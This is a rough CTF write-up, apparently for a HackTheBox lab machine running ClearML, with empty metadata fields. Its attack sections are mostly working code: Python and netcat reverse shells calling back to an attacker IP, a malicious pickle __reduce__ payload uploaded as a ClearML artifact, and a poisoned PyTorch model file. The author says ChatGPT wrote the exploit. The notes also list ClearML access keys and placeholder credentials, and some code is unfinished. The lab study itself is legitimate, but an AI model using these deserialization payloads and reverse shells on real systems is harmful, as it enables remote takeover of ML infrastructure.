# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/cnzew07.png)
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.21",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")

#!/usr/bin/python3

import socket,subprocess,os
import pty

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.21",8000))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

print(os.system('whoami'))
pty.spawn("/bin/bash")


api.api_server = http://api.blurry.htb

api.web_server = http://app.blurry.htb

api.files_server = http://files.blurry.htb

api.credentials.access_key = 8TL83TDO2YXCQ4789DE4
==============

api.web_server = https://app.community.clear.ml

api.api_server = https://api.community.clear.ml

api.files_server = https://files.community.clear.ml

api.credentials.access_key = T1RYD584943ZPXZ4JS6D

data: rawdata.csv

user: root

password: password


from clearml import Task

task = Task.get_task(task_id='')
artifcat = task.artifacts.get('pickle_artifact')
pickle_local_path = artifact.get()

import pickle,os
class RunCommand:
			def __reduce__(self):


import os
import pickle
from clearml import Task
class RunCommand:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.21 8003 >/tmp/f',))
command = RunCommand()
task = Task.init(project_name='Black Swan', task_name='pickle_artifacts')
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True)
```
### Gaining Access
https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/
![](https://i.imgur.com/88T96VD.png)
- The blog video gives u hint and based on that i made Chat GPT to write for me
![](https://i.imgur.com/kigLHOI.png)
![](https://i.imgur.com/n807tac.jpeg)

- Then i cloned 1 of the tasks and i pasted my code inside. after setting up the clearml on my localmachine.
![](https://i.imgur.com/kjFiPNF.png)
![](https://i.imgur.com/YKhGmM3.png)

## Internal
### Enumeration
`$enum$`

### Gaining Access


### Maintaining Access
![](https://i.imgur.com/IS0KXBA.png)
![](https://i.imgur.com/rRuptdx.png)
`/usr/bin/evaluate_model /models/*.pth`
![](https://i.imgur.com/wvhVmMo.png)
```python
import torch
import pickle

ON_REDUCE = """
global MAGIC_NUMBER
MAGIC_NUMBER = None
import os;os.system(echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.21 8203 >/tmp/f')
"""

class Payload:
    def __reduce__(self):
        return (exec, (ON_REDUCE,))

model = torch.load('demo_model.pth')
torch.serialization.MAGIC_NUMBER = Payload()
torch.save(model, 'evil.pth')
```
![](https://i.imgur.com/fTwd7n9.png)
![](https://i.imgur.com/xPFp72u.jpeg)
- This didnt work then when i try to delet the evaluate file it deleted that means, i can create my oun evaluate script.
![](https://i.imgur.com/9XdjkLF.png)
evaluate_model.py
# Random Notes